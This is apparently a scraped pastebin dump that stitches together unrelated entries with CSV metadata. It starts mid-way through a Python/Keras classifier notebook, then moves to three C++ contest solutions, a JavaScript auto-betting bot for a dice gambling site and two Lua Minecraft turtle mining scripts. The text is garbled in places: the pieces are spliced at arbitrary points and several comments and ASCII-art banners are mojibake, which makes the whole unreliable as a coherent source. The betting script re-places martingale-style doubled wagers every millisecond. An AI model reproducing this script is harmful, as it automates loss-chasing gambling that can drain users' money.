# Assuming 'new_persons_results' is a list of new persons, where each person is represented as a list of features
new_persons_results = [
   # [101, 112],
   # [0.54422416, 0.02778176],
   # [22.57372914, 17.96922325],
#    [22.57372914, 17.96922325]
    # Add more new persons as needed
#          [23.65780072, 18.8599168 ],
#          [22.57372914, 17.96922325],
#          [32.55342397, 29.46365141],
#          [ 6.71803504, 25.70466547],
#          [ 6.71803504, 25.70466547],
#          [14.40191857, 16.77085649],
#          [17.45790731, 21.76521471],
#          [2110.02796947, 73.45445955],
#          [30.29513837, 62.90111289],
#          [15.1289778,  32.40267702],

 [23.65780072, 18.8599168 ],
 [22.57372914, 17.96922325],
 [32.55342397, 29.46365141],
 [ 6.71803504, 25.70466547],
 [14.40191857, 16.77085649],
 [17.45790731, 21.76521471],
 [20.02796947, 73.45445955],

]

import sys

for epoch in tqdm_notebook(range(epochs)):
    history = model.fit(X_train_normalized, np.array(y_train), epochs=1, verbose=0, shuffle=False)
    accuracy_history.append(history.history['accuracy'][0])

    if epoch == 1:
        # Normalize the testing data
        X_test_normalized = (X_test - min_values) / (max_values - min_values)
        y_pred_after_2nd_epoch = model.predict(X_test_normalized)
        y_pred_binary_after_2nd_epoch = [1 if pred >= 0.5 else 0 for pred in y_pred_after_2nd_epoch]
        image_testing_before_2nd_epoch = create_image(X_test_normalized, y_pred_binary_after_2nd_epoch, label_colors_testing)

    if epoch >= epochs-1:
        print(f""HERE HERE Epoch: {epoch}, Epochs: {epochs}\n"")
        sys.stdout.flush()

        # Iterate through new persons
        for idx, personNEW_results in enumerate(new_persons_results, start=1):
            # Ensure that personNEW_results has the same number of features as the model expects
            assert len(personNEW_results) == len(X_train[0]), ""Mismatch in the number of features.""

            personNEW_results_normalized = (np.array(personNEW_results) - min_values) / (max_values - min_values)

            personNEW_prediction = model.predict(np.array([personNEW_results_normalized]))
            personNEW_label = 1 if personNEW_prediction >= 0.5 else 0
            y_pred_after_50_epochs = model.predict(X_test_normalized)
            y_pred_binary_after_50_epochs = [1 if pred >= 0.5 else 0 for pred in y_pred_after_50_epochs]
            image_testing_after_50_epochs = create_image(X_test_normalized, y_pred_binary_after_50_epochs, label_colors_testing)

            # Create an image for the new person
            image_personNEW = create_imageN([personNEW_results_normalized], [personNEW_label], label_colors)

            # Display the images
            plt.figure(figsize=(5, 5))
            plt.imshow(image_personNEW)
            plt.title(f""New Person {idx}\nLabel: {personNEW_label}, Prediction: {personNEW_prediction}"")
            plt.axis(""off"")
            plt.show()


# Display the images
plt.figure(figsize=(25, 15))
plt.subplot(2, 2, 1)
plt.imshow(image_training)
plt.title(""Training Data"")
plt.axis(""off"")

plt.subplot(2, 2, 2)
plt.imshow(image_testing_before_2nd_epoch)
plt.title(""Testing Data (2nd Epoch)"")
plt.axis(""off"")

plt.subplot(2, 2, 3)
plt.imshow(image_testing_after_50_epochs)
plt.title(f""Testing Data ({epochs} Epochs)"")
plt.axis(""off"")

plt.subplot(2, 2, 4)
plt.imshow(image_personNEW)
plt.title(f""New Person\nLabel: {personNEW_label},[{personNEW_prediction}]"")
plt.axis(""off"")

# Plot accuracy history
plt.figure(figsize=(12, 5))
plt.plot(range(1, epochs + 1), accuracy_history, marker='o')
plt.title('Accuracy Over Epochs')
plt.xlabel('Epochs')
plt.ylabel('Accuracy')
plt.grid()

# Print normalized data
print(""Normalized PersonNEW Data:"")
print(personNEW_results_normalized)

plt.show()

print(""X_train before normalization:"")
print(X_train)
print(""X_test before normalization:"")
print(X_test)

import seaborn as sns


print(""KKKKKKKKKKKKKKKKKKKKKKKKKKKKKKK"")
print(X_test)
print(""HHHHHHHHHHHHHHHHHHHHHHHHHHHHHH"")
print(X_train)
print(""LLLLLLLLLLLLLLLLLLLLLLLLLLLLL"")


# y_pred_binary = [1 if pred >= 0.5 else 0 for pred in model.predict(X_test_normalized)]

# # Create confusion matrix
# conf_matrix = confusion_matrix(y_train, y_pred_binary)
# print(conf_matrix)


from sklearn.metrics import confusion_matrix
from tensorflow.keras.utils import to_categorical

# # Normalize the training data
# min_values = np.min(np.concatenate([X_train, X_test], axis=0), axis=0)
# max_values = np.max(np.concatenate([X_train, X_test], axis=0), axis=0)
# X_train_normalized = (X_train - min_values) / (max_values - min_values)
# X_test_normalized = (X_test - min_values) / (max_values - min_values)

np.set_printoptions(threshold=np.inf, precision=4, suppress=True)


# # Assuming X_test_normalized and y_test are your test set data
# y_pred_binary = [1 if pred >= 0.5 else 0 for pred in model.predict(X_test_normalized)]

# # Create confusion matrix using the test set
# conf_matrix = confusion_matrix(y_test, y_pred_binary)
# print(conf_matrix)



# plt.figure(figsize=(6, 6))
# sns.heatmap(conf_matrix, annot=True, fmt=""d"", cmap=""Blues"", xticklabels=['Predicted 0', 'Predicted 1'], yticklabels=['Actual 0', 'Actual 1'])
# plt.xlabel(""Predicted Label"")
# plt.ylabel(""True Label"")
# plt.title(""Confusion Matrix"")
# plt.show()

# X_train = np.array(X_train)
# y_train_one_hot = np.array(y_train_one_hot)

# Rozd√Ñ‚Ä∫lenƒÇ¬≠ dat na trƒÇ¬©novacƒÇ¬≠ a testovacƒÇ¬≠ mnoƒπƒæiny
###X_train, X_test, y_train, y_test = data[:num_training_rows], data[-num_testing_rows:], labels[:num_training_rows], labels[-num_testing_rows:]

###X_train, X_test, y_train, y_test = data[:num_training_rows], data[:num_training_rows], labels[:num_training_rows], labels[:num_training_rows]
X_train, X_test, y_train, y_test = data[:num_training_rows], data[:num_testing_rows], labels[:num_training_rows], labels[:num_testing_rows]

import numpy as np
import matplotlib.pyplot as plt
from sklearn.metrics import confusion_matrix, accuracy_score, precision_score, recall_score, f1_score
import tensorflow as tf
import seaborn as sns

# Assuming data splitting and model definition have been done correctly

# Compile the model
model.compile(optimizer='adam', loss='binary_crossentropy', metrics=['accuracy'])

# Train the model
print(""Training Start"")
for epoch in tqdm_notebook(range(100), desc=""Training Progress""):
    model.fit(np.array(X_train_normalized), np.array(y_train), epochs=1, verbose=0)
print(""Training Complete"")

# Generate predictions from the model
predictions = (model.predict(X_test_normalized) > 0.5).astype(int)

# Convert y_test to a numpy array and then to binary labels
y_test_array = np.array(y_test)  # Convert y_test to a numpy array
y_test_binary = (y_test_array > 0.5).astype(int)  # Convert to binary

# Compute the confusion matrix
conf_matrix = confusion_matrix(y_test_binary, predictions)

# Evaluate the model's performance
accuracy = accuracy_score(y_test_binary, predictions)
precision = precision_score(y_test_binary, predictions)
recall = recall_score(y_test_binary, predictions)
f1 = f1_score(y_test_binary, predictions)

# Display the confusion matrix
sns.heatmap(conf_matrix, annot=True, fmt='d', cmap='Blues')
plt.xlabel('Predicted')
plt.ylabel('Actual')
plt.title('Confusion Matrix')
plt.show()

print(f""Accuracy: {accuracy:.4f}"")
print(f""Precision: {precision:.4f}"")
print(f""Recall: {recall:.4f}"")
print(f""F1 Score: {f1:.4f}"")

print(f""Confusion Matrix2122:\n{conf_matrix}"")"
yUkfKkaw,C,Ankit_132,C++,Sunday 26th of May 2024 01:07:49 PM CDT,"#include<bits/stdc++.h>
using namespace std;

#define int long long

signed  main(){
    int t;
    cin>>t;

	while(t--){
        int n;
        cin >> n;
        vector<int> a(n);

        for(auto &e: a) cin>>e;

        int x = 1, f = 0;
        int mx = *max_element(a.begin(),a.end());

        for(int i = 0; i < n; i++){
            x = lcm(x,a[i]);
            if(x > mx){
                cout << n << ""\n"";
                f = 1 ;
                break;
            }
        }

        if(f)       continue;

        map<int,int> dp, dp2;
        dp[1] = 0;

        for(int i = 0; i < n; i++){
            dp2 = dp;
            
            for(auto [x,y] : dp){
                int val = lcm(x,a[i]);
                dp2[val] = max(dp2[val], y + 1);
            }

            dp = dp2;
        }

        int ans = 0;
        set<int> aa(a.begin(),a.end());

        for(auto [x,y] : dp){
            if(!aa.count(x))
                ans = max(ans,y);
        }

        cout << ans << ""\n"";
	}
}"
X7d9Qcj2,B,Ankit_132,C++,Sunday 26th of May 2024 01:06:40 PM CDT,"#include<bits/stdc++.h>
using namespace std;

int main(){
    int t;
    cin>>t;

    while(t--){
        int x;
        cin>>x;

        vector<int> v(32);

        for(int i=29; i>=0; i--){
            v[i] = (x >= (1<<i));
            x %= (1<<i);
        }

        for(int i=0, j; i<32;){

            if(!v[i]){
                i++;
                continue;
            }

            j = i+1;
            while(v[j])
            {
                v[j] = 0;
                j++;
            }

            if(j > i+1)
            {
                v[j] = 1;
                v[i] = -1;
            }

            i = j;
        }

        cout<<32<<""\n"";
        for(auto e: v)
            cout<<e<<"" "";
        cout<<""\n"";

    }
}"
s7PTQKyB,A,Ankit_132,C++,Sunday 26th of May 2024 01:05:43 PM CDT,"#include<bits/stdc++.h>
using namespace std;

int main(){
    int t;
    cin>>t;
    
    while(t--){
        int n, m;
        cin>>n>>m;
        
        if(n>=m && n%2==m%2)
            cout<<""Yes\n"";
        else
            cout<<""No\n"";
    }
}"
39zpTJ9t,unreal snowybot powerful,coinwalk,JavaScript,Sunday 26th of May 2024 12:57:31 PM CDT,"var elderly = parseFloat(document.getElementById('pct_balance').value);
var prefit = Number((elderly/1000).toFixed(8));
var beast = prefit;
var crust = (prefit/2)
var tens = (prefit*10);
var sevens = (prefit*6.9);
var eights = (prefit*7.9);
var fives = (prefit*4.9);
var fours = (prefit*4);
var winnerdinner = (elderly*24);
var snowy = ((Math.floor(elderly/tens))*tens);
var snowzy = ((Math.floor(elderly/tens))*tens);
var snowie = 0;
var great = elderly;
var snot = elderly;
var nomnom = true;
 
function go(){
great = document.getElementById('pct_balance').value;
var dog = Number((great-elderly).toFixed(8));
console.log(""profit"");
console.log(dog);
if (((great>(((Math.floor(great/tens))*tens)+sevens))&&(great<(((Math.floor(great/tens))*tens)+eights))&&(great<(snowie-crust)))||((great>(((Math.floor(great/tens))*tens)+sevens))&&(great<(((Math.floor(great/tens))*tens)+eights))&&(great>(snowie+crust)))){
    beast = beast*2;
    snowie = parseFloat(great);
}
if ((great<=(snowy-tens))&&(great<(((Math.floor(great/tens))*tens)+fives))){
    beast = prefit;
    upped = 6.9;
    downed = 2.9;
    fart = 0;
    snowie = 0;
    snot = parseFloat(great);
    snowy = ((Math.floor(great/tens))*tens);
    snowzy = ((Math.floor(great/tens))*tens);
}
if (great>snowy){
    snowy = ((Math.floor(great/tens))*tens);
    }
if (great>snot){
    snot = parseFloat(great);
    }
if ((beast>fours)&&(great>=snot)&&(great<(((Math.floor(great/tens))*tens)+sevens))){
    beast = prefit;
    snowie = 0;
    snot = parseFloat(great);
    snowy = ((Math.floor(great/tens))*tens);
    snowzy = ((Math.floor(great/tens))*tens);
}
if ((beast>fours)&&(great>=snot)&&(great>(((Math.floor(great/tens))*tens)+eights))){
    beast = prefit;
    snowie = 0;
    snot = parseFloat(great);
    snowy = ((Math.floor(great/tens))*tens);
    snowzy = ((Math.floor(great/tens))*tens);
}
if ((great>=(snowzy+(tens*3)))&&(great>(((Math.floor(great/tens))*tens)+eights))){
    beast = prefit;
    snowie = 0;
    snot = parseFloat(great);
    snowy = ((Math.floor(great/tens))*tens);
    snowzy = ((Math.floor(great/tens))*tens);
}
if ((great>=(snowzy+(tens*3)))&&(great<(((Math.floor(great/tens))*tens)+sevens))){
    beast = prefit;
    snowie = 0;
    snot = parseFloat(great);
    snowy = ((Math.floor(great/tens))*tens);
    snowzy = ((Math.floor(great/tens))*tens);
}
if ((great>=(snowzy+(tens*3)))&&(great>(((Math.floor(great/tens))*tens)+sevens))&&(great<(((Math.floor(great/tens))*tens)+eights))){
    beast = prefit*2;
    snot = parseFloat(great);
    snowie = parseFloat(great);
    snowy = ((Math.floor(great/tens))*tens);
    snowzy = ((Math.floor(great/tens))*tens);
}
if (great>=winnerdinner){
console.log(""winner winner chicken dinner"");
return;
}
$('#pct_chance').val(49.5);
$('#pct_bet').val(((beast*1).toFixed(8)));
$('#a_lo').click();
setTimeout(() => go(), 1);
}
go();"
JvGp5Ts7,stairs.lua,Cwackers,Lua,Sunday 26th of May 2024 12:43:09 PM CDT,"-- Cloned
-- Digs a staircase around a quarry
-- Run ""stairs help""
-- Or dig a staircase to bedrock
-- Run ""stairs""
-- <Flexico64@gmail.com>
-- Please email me if you have any
-- bugs or suggestions!

-----------------------------------
-- ¬†/¬Ø\¬†¬†||¬†||¬†¬†/\¬†¬†|¬Ø\¬†|¬Ø\¬†\\//¬†--
-- |¬†O¬†|¬†||_||¬†|¬†¬†|¬†|¬†/¬†|¬†/¬†¬†\/¬†¬†--
-- ¬†\_\\¬†¬†\__|¬†||||¬†|¬†\¬†|¬†\¬†¬†||¬†¬†--
-----------------------------------
--¬†/¬Ø¬Ø\¬†[¬Ø¬Ø]¬†¬†/\¬†¬†[¬Ø¬Ø]¬†|¬Ø\¬†/¬Ø¬Ø\¬† --
--¬†\_¬Ø\¬†¬†||¬†¬†|¬†¬†|¬†¬†][¬†¬†|¬†/¬†\_¬Ø\¬† --
--¬†\__/¬†¬†||¬†¬†||||¬†[__]¬†|¬†\¬†\__/¬† --
-----------------------------------

-- Names of tools
local name_torch = {
   ""torch"", ""lantern"", ""lamp"", ""light"" }
local name_bench = {
   ""minecraft:crafting_table"",
   ""forge:workbench"" }
local name_chest = { ""chest"" }
local name_box = {
   ""shulker_box"", ""travelersbackpack"" }

-- Stair blocks crafting material
local name_cobble = {
  ""minecraft:cobblestone"",
  ""forge:cobblestone"" }


-- Side that swaps with crafting bench
local tool_side = ""none""
if not peripheral.find(""workbench"") then
 tool_side = ""left""
 if peripheral.getType(""left"") == ""modem"" then
  tool_side = ""right""
 end --if
end --if


-- Load APIs
os.loadAPI(""flex.lua"")
os.loadAPI(""dig.lua"")
dig.setFuelSlot(1)
dig.setBlockSlot(2)
dig.setBlockStacks(4)


function dump()
 local slot = turtle.getSelectedSlot()
 local keepers = { name_cobble, name_box,
    name_torch, name_bench, name_chest,
    ""stairs"" }
 local x,a = 0,false
 
 for x=1,16 do
  if flex.isItem(name_box,x) then
   turtle.select(x)
   a = turtle.placeUp()
   break
  end --if
 end --for
 
 if not a then
  keepers[#keepers+1] = ""diamond""
  keepers[#keepers+1] = ""ancient_debris""
 end --if
 
 local blocksPresent = dig.getBlockStacks()
 for x=4,16 do
  if not flex.isItem(keepers,x) then
   if dig.isDumpItem(x) then
    if blocksPresent <= 0 then
     turtle.drop()
    else
     blocksPresent = blocksPresent - 1
    end --if/else
   else
    turtle.select(x)
    if a then
     turtle.dropUp()
    else
     turtle.drop()
    end --if/else
   end --if/else
  end --if
 end --for
 
 turtle.select(slot)
 if a then turtle.digUp() end
 dig.checkBlocks()
 flex.condense()
end --function



-- Program parameter(s)
local args={...}

-- Tutorial, kind of
if #args > 0 and args[1] == ""help"" then
 flex.printColors(""Place just to the ""..
   ""left of a turtle quarrying the same ""..
   ""dimensions."",colors.lightBlue)
 flex.printColors(""Include a crafting ""..
   ""table and a chest in turtle's ""..
   ""inventory to auto-craft a staircase"",
   colors.yellow)
 flex.printColors(""Usage: stairs ""..
   ""[length] [width] [depth]"",colors.pink)
 return
end --if


-- What Goes Where
flex.printColors(""Slot 1: Fuel\n""..
  ""Slot 2: Blocks\nSlot 3: Torches\n""..
  ""Anywhere: Crafting Bench, Chest\n""..
  ""Optional: Shulker Box / Backpack"",
  colors.lightBlue)
flex.printColors(""Press Enter"",
  colors.pink)
while flex.getKey() ~= keys.enter do
 sleep(0.1)
end --while


-- Convert Inputs
local dx,dy,dz,n,x,y,z
local height = 5
dz = tonumber(args[1]) or 256
dx = tonumber(args[2]) or dz
dy = tonumber(args[3]) or 256
-- -1 to match Quarry depth


--------------------------------------
-- |¬Ø\¬†[¬Ø¬Ø]¬†/¬Ø¬Ø]¬†/¬Ø¬Ø][¬Ø¬Ø]|\¬†||¬†/¬Ø¬Ø]¬†--
-- |¬† |¬†][¬†|¬†[¬Ø||¬†[¬Ø|¬†][¬†|¬†\¬†||¬†[¬Ø|¬†--
-- |_/¬†[__]¬†\__|¬†\__|[__]||¬†\|¬†\__|¬†--
--------------------------------------

flex.send(""Digging staircase..."",
  colors.yellow)

-- Staircase Digging Functions

local torchNum = 9

function placeTorch()
 turtle.select(3)
 if flex.isItem(name_torch) then
  
  if not turtle.place() then
   if not dig.fwd() then return false end
   turtle.select(2)
   dig.place()
   if not dig.back() then return false end
   
   turtle.select(3)
   if not dig.place() then
    if not dig.fwd() then return false end
    turtle.select(2)
    dig.placeUp()
    if not dig.back() then return false end
    turtle.select(3)
    dig.place()
   end --if/else
  end --if
 end --if
 
 turtle.select(2)
end --function


function stepDown()
 local x
 
 turtle.select(2)
 dig.right()
 for x=1,height-2 do
  dig.blockLava()
  if not dig.up() then return false end
 end --for
 dig.blockLava()
 dig.blockLavaUp()
 
 dig.left()
 dig.blockLava()
 dig.left()
 if not dig.fwd() then return false end
 dig.blockLavaUp()
 dig.blockLava()
 dig.right()
 dig.blockLava()
 dig.left()
 
 if torchNum >= 3 then
  if not dig.back() then return false end
  placeTorch()
  if not dig.down() then return false end
  if not dig.fwd() then return false end
  torchNum = 0
 else
  dig.blockLava()
  if not dig.down() then return false end
  torchNum = torchNum + 1
 end --if/else
 
 for x=1,height-2 do
  dig.blockLava()
  if not dig.down() then return false end
 end --for
 dig.blockLava()
 if not dig.placeDown() then return false end
 
 dig.right(2)
 if not dig.fwd() then return false end
 dig.blockLava()
 if not dig.placeDown() then return false end
 dig.left()
 
 if turtle.getItemCount(16) > 0 then
  dig.left()
  dump()
  dig.right()
 end --if/else
 
 if not dig.fwd() then return false end
 
 return true
end --function


local function turnRight()
 turtle.select(2)
 dig.right()
 if not dig.up(height-2) then return false end
 dig.blockLavaUp()
 
 dig.left()
 if not dig.down() then return false end
 if not dig.fwd() then return false end
 dig.blockLavaUp()
 for x=1,height-3 do
  dig.blockLava()
  if not dig.down() then return false end
 end --for
 dig.blockLava()
 if not dig.placeDown() then return false end
 
 dig.left()
 if not dig.fwd() then return false end
 for x=1,height-3 do
  dig.blockLava()
  if not dig.up() then return false end
 end --for
 dig.blockLava()
 dig.blockLavaUp()
 
 dig.right()
 for x=1,height-3 do
  dig.blockLava()
  if not dig.down() then return false end
 end --for
 dig.blockLava()
 if not dig.placeDown() then return false end
 
 dig.left(2)
 if not dig.fwd() then return false end
 dig.right()
 if not dig.placeDown() then return false end
 for x=1,height-2 do
  dig.blockLava()
  if not dig.up() then return false end
 end --for
 dig.blockLava()
 dig.blockLavaUp()
 
 dig.right(2)
 if not dig.fwd() then return false end
 if not dig.down(height-1) then return false end
 if not dig.placeDown() then return false end
 dig.left()
 if not dig.fwd() then return false end
 dig.blockLava()
 if not dig.placeDown() then return false end
 if not dig.back() then return false end
 dig.right()
 if not dig.fwd() then return false end
 
 torchNum = torchNum + 1
 return true
end --function


function endcap(h,stop)
 stop = ( stop ~= nil )
 h = h or 0 -- Height to dig layer
 local x
 
 dig.right()
 if not dig.placeDown() then return false end
 dig.checkBlocks()
 for x=1,height-2-h do
  dig.blockLava()
  if not dig.up() then return false end
 end --for
 dig.blockLava()
 dig.blockLavaUp()
 
 dig.left(2)
 if not dig.fwd() then return false end
 dig.blockLavaUp()
 for x=1,height-2-h do
  dig.blockLava()
  if not dig.down() then return false end
 end --for
 dig.blockLava()
 if not dig.placeDown() then return false end
 dig.checkBlocks()
 if not dig.back() then return false end
 
 dig.right()
 
 if stop then
  dig.blockLava()
  for x=1,height-2-h do
   if not dig.up() then return false end
   dig.blockLava()
  end --for
  dig.blockLavaUp()
  dig.left()
  
  if not dig.fwd() then return false end
  dig.blockLavaUp()
  dig.right()
  dig.blockLava()
  for x=1,height-2-h do
   if not dig.down() then return false end
   dig.blockLava()
  end --for
  
  dig.left()
  if not dig.back() then return false end
  dig.right()
  
 end --if
 
 return true
end --function



local direction

function avoidBedrock()
 if dig.isStuck() then
  -- Hit Bedrock/Void
  if dig.getStuckDir() == ""fwd"" then
   dig.up()
   dig.placeDown()
   dig.checkBlocks()
   dig.setymin(dig.gety())
   dig.fwd()
  elseif dig.getStuckDir() == ""down"" then
   dig.setymin(dig.gety())
  end --if
 end --if
 
 -- Get X and Z on the inner stair block
 if dig.getx() >= dx+2 then
  dig.gotox(dx+1)
  
 elseif dig.getx() <= -1 then
  dig.gotox(0)
  
 end --if/else
 
 if dig.getz() >= dz+1 then
  dig.gotoz(dz)
  
 elseif dig.getz() <= -2 then
  dig.gotoz(-1)
  
 end --if/else
 
 dig.gotor(direction)
 dig.gotoy(dig.getymin())
end --function



-- Start Digging

turtle.select(2)

x = 0
direction = dig.getr()
while true do
 
 for n=0,dz-1 do
  if not stepDown() then break end
  x = x + 1
  if x >= dy then break end
 end
 if dig.isStuck() or x >= dy then break end
 if not turnRight() then break end
 x = x + 1
 
 direction = dig.getr()
 for n=0,dx-1 do
  if not stepDown() then break end
  x = x + 1
  if x >= dy then break end
 end
 if dig.isStuck() or x >= dy then break end
 if not turnRight() then break end
 x = x + 1
 
 direction = dig.getr()
end

avoidBedrock()
if not dig.fwd() then avoidBedrock() end
if not endcap(1) then avoidBedrock() end
if not dig.fwd() then avoidBedrock() end
if not endcap(1,true) then avoidBedrock() end

dig.left(2)
while not turtle.detect() do
 dig.fwd()
end --while
dig.back()

-- This bit compensates for random Bedrock (mostly)
if #dig.getKnownBedrock() > 0 then
 for x=1,4 do
  dig.placeDown()
  dig.right()
  dig.fwd()
 end --for
end --for



----------------------------------------------
-- ¬†/¬Ø]¬†|¬Ø\¬†¬†/\¬†¬†|¬Ø¬Ø]¬†[¬Ø¬Ø]¬†[¬Ø¬Ø]¬†|\¬†||¬†¬†/¬Ø¬Ø]¬†--
-- |¬†[¬†¬†|¬†/¬†|¬†¬†|¬†|¬†]¬†¬†¬†||¬†¬†¬†][¬†¬†|¬†\¬†|¬†|¬†[¬Ø|¬†--
-- ¬†\_]¬†|¬†\¬†||||¬†||¬†¬†¬†¬†||¬†¬†[__]¬†||¬†\|¬†¬†\__|¬†--
----------------------------------------------

-- Return locations of bench/chest
local function checkTools()
 local bench,chest = 0,0
 local x
 for x=1,16 do
  turtle.select(x)
  if flex.isItem(name_bench) then
   bench = x
  elseif flex.isItem(name_chest) then
   chest = x
  end --if/else
 end --for
 return bench,chest
end --function


local oldTool
local success = true

local function equip()
 if tool_side == ""right"" then
  return turtle.equipRight()
 elseif tool_side == ""left"" then
  return turtle.equipLeft()
 end --if/else
end --function


-- Equip Crafting Bench
local function setTool()
 if tool_side == ""none"" then return end
 
 flex.condense()
 local x,y = checkTools()
 
 if x == 0 then
  flex.send(""Crafting Bench not found"",
    colors.red)
  success = false
  return false
 end --if
 
 turtle.select(x)
 y = turtle.getItemCount()
 if y > 1 then
  turtle.transferTo(math.min(
    x+1,16),y-1)
 end --if
 
 if not equip() then
  return false
 end --if
 
 if turtle.getItemCount() > 0 then
  oldTool = turtle.getItemDetail()[""name""]
 end --if
 
 flex.send(""Crafting Bench equipped"",
   colors.yellow)
 return true
end --function setTool()


-- Unequip Crafting Bench
local function restoreTool()
 if tool_side == ""none"" then return end
 
 flex.condense()
 local slot = turtle.getSelectedSlot()
 local x,y
 for x=1,16 do
  turtle.select(x)
  y = turtle.getItemCount()
  
  if oldTool == nil then
   -- If no tool, put Bench in empty slot
   if y == 0 then
    return equip()
   end --if
   
  else
   if y > 0 then
    if turtle.getItemDetail()[""name""]
       == oldTool then
     if equip() then
	     flex.send(""Tool restored"",
	       colors.lightBlue)
	     turtle.select(slot)
      return true
     end --if
    end --if
   end --if
  end --if
 end --for
 
 flex.send(""Unable to restore tool"",
   colors.red)
 success = false
 return false
end --function restoreTool()


local depth = -dig.gety()
local bench, chest = checkTools()
local stairsNeeded = depth*2
local craftNum

-- Count existing stair blocks
local numStairs = 0
for x=1,16 do
 turtle.select(x)
 y = turtle.getItemCount()
 if y > 0 then
  if flex.isItem(""stairs"") then
   numStairs = numStairs + y
  end --if
 end --if
end --for

-- Count Cobblestone
local numCobble = 0
for x=1,16 do
 turtle.select(x)
 if flex.isItem(name_cobble) then
  numCobble = numCobble + turtle.getItemCount()
 end --if
end --for
turtle.select(1)

craftNum = math.ceil((stairsNeeded-numStairs)/4)


-- Check against cobble needed
if numCobble < craftNum*6
   or stairsNeeded > 64*4 then
 
 x = math.floor(numCobble/6)
 x = math.min(x,64)
 y = math.ceil(stairsNeeded/4)
 z = math.floor(100*x/y)
 
 flex.send(""#1Only enough cobblestone ""
   ..""to craft #4""..tostring(z)
   ..""#0%#1 of stairs"")
 success = false
 
 craftNum = x
end --if

if craftNum < 0 then
 craftNum = 0
end --if



-- If Crafting needs to (and can) happen
if craftNum > 0 and chest > 0 and
   ( bench > 0 or tool_side == ""none"" ) then
 
 local stairSlots = {1,5,6,9,10,11}
 local freeSlots = {2,3,4,7,8,12,13,14,15,16}
 
 -- Equip Crafing Banch and place Chest
 setTool()
 turtle.select(chest)
 turtle.place()
 
 -- Everything except Cobble into Chest
 for x=1,16 do
  turtle.select(x)
  if turtle.getItemCount() > 0 then
   if not flex.isItem(name_cobble)
      or flex.isItem(""stairs"") then
    turtle.drop()
   end --if
  end --if
 end --for
 flex.condense()
 
 -- Collect Cobble to Craft
 for x=1,11 do
  turtle.select(x)
  if x <= 5 then
   turtle.transferTo(x+11)
  elseif x == 6 then
   turtle.transferTo(4)
  elseif x == 7 then
   turtle.transferTo(8)
  else
   turtle.drop()
  end --if/else
  if turtle.getItemCount() > 0 then
   turtle.drop()
  end --if
 end --for
 
 -- Arrange Cobble into Recipe
 z = 16
 for x=1,#stairSlots do
  turtle.select(z)
  while turtle.getItemCount() < craftNum do
   if z > 12 then
    z = z-1
   else
    z = z-4
   end --if
   if z < 1 then break end
   turtle.select(z)
  end --while
  if z < 1 then break end
  turtle.select(z)
  turtle.transferTo(stairSlots[x],
    craftNum)
 end --for
 
 -- Drop excess cobble into chest
 for x=1,#freeSlots do
  turtle.select(freeSlots[x])
  turtle.drop()
 end --for
 
 -- Main Event! Craft Function! =D
 local cb = peripheral.wrap(""left"") or
            peripheral.wrap(""right"")
 if cb.craft(craftNum) then
  flex.send(""Stairs crafted"",colors.lightBlue)
 else
  flex.send(""Crafting error"",colors.red)
  success = false
 end --if
 
 -- Restore inventory in correct order
 for x=1,16 do
  turtle.select(x)
  turtle.drop()
 end --for
 turtle.select(1)
 while turtle.suck() do end
 restoreTool()
 turtle.dig()
 flex.condense()
 
end --if (crafting needed)





-----------------------------------------------
-- |¬Ø\¬†||¬†||¬†[¬Ø¬Ø]¬†||¬†¬†¬†|¬Ø\¬†¬†[¬Ø¬Ø]¬†|\¬†||¬†¬†/¬Ø¬Ø]¬†--
-- |¬†<¬†||_||¬†¬†][¬†¬†||_¬†¬†|¬†¬†|¬†¬†][¬†¬†|¬†\¬†|¬†|¬†[¬Ø|¬†--
-- |_/¬†¬†\__|¬†[__]¬†|__]¬†|_/¬†¬†[__]¬†||¬†\|¬†¬†\__|¬†--
-----------------------------------------------


local function placeStairs()
 local x,y,z,slot
 slot = turtle.getSelectedSlot()
 y = turtle.getItemCount()
 z = true
 
 if y < 2 or not flex.isItem(""stairs"") then
  for x=1,16 do
   turtle.select(x)
   y = turtle.getItemCount()
   if y >= 2 and flex.isItem(""stairs"") then
    z = false
    break
   end --if
  end --for
  
  if z then
   turtle.select(slot)
   return false
  end --if
 end --if
 
 dig.placeDown()
 dig.right()
 dig.fwd()
 dig.left()
 dig.placeDown()
 dig.left()
 dig.fwd()
 dig.right()
end --function


flex.send(""Returning to surface"",
  colors.yellow)

function isDone()
 -- Reached Surface
 return dig.gety() >= 0
end

-- Follow the Spiral [and place Stairs]
while not isDone() do

 if dig.getr()%360 == 0 then
  while dig.getz() < dig.getzmax()-1 do
   dig.fwd()
   dig.up()
   placeStairs()
   if isDone() then break end
  end --while
  
 elseif dig.getr()%360 == 90 then
  while dig.getx() < dig.getxmax()-1 do
   dig.fwd()
   dig.up()
   placeStairs()
   if isDone() then break end
  end --while
  
 elseif dig.getr()%360 == 180 then
  while dig.getz() > dig.getzmin()+1 do
   dig.fwd()
   dig.up()
   placeStairs()
   if dig.gety() > -4 and dig.getz()
      == dig.getzmin()+1 then
    -- Up at the top
    dig.fwd()
    dig.up()
    placeStairs()
   end --if
   if isDone() then break end
  end --while
  
 elseif dig.getr()%360 == 270 then
  while dig.getx() > dig.getxmin()+1 do
   dig.fwd()
   dig.up()
   placeStairs()
   if isDone() then break end
  end --while
  
 end --if/else
 
 if not isDone() then dig.left() end
 
end --while


-- All Done!
turtle.select(1)
dig.goto(0,0,0,0)

if success then
 flex.send(""Stairway finished!"",
   colors.lightBlue)
else
 flex.send(""Reached Origin"",
   colors.lightBlue)
end --if

flex.modemOff()
os.unloadAPI(""dig.lua"")
os.unloadAPI(""flex.lua"")
"
UHsLqCqU,quarry.lua,Cwackers,Lua,Sunday 26th of May 2024 12:42:59 PM CDT,"-- Cloned
-- This is a replacement for the
-- 'excavate' program, as it can re-
-- cover from a reboot/unload event.
-- Also avoids destroying spawners!
-- <Flexico64@gmail.com>
-- Please email me if you have any
-- bugs or suggestions!

-----------------------------------
-- [¬Ø¬Ø]¬†||¬†||¬†|¬Ø\¬†[¬Ø¬Ø]¬†||¬†¬†¬†|¬Ø¬Ø]¬†--
-- ¬†||¬†¬†||_||¬†|¬†/¬†¬†||¬†¬†||_¬†¬†|¬†]¬†¬†--
-- ¬†||¬†¬†¬†\__|¬†|¬†\¬†¬†||¬†¬†|__]¬†|__]¬†--
-----------------------------------
-- ¬†/¬Ø\¬†¬†||¬†||¬†¬†/\¬†¬†|¬Ø\¬†|¬Ø\¬†\\//¬†--
-- |¬†O¬†|¬†||_||¬†|¬†¬†|¬†|¬†/¬†|¬†/¬†¬†\/¬†¬†--
-- ¬†\_\\¬†¬†\__|¬†||||¬†|¬†\¬†|¬†\¬†¬†||¬†¬†--
-----------------------------------

os.loadAPI(""flex.lua"")
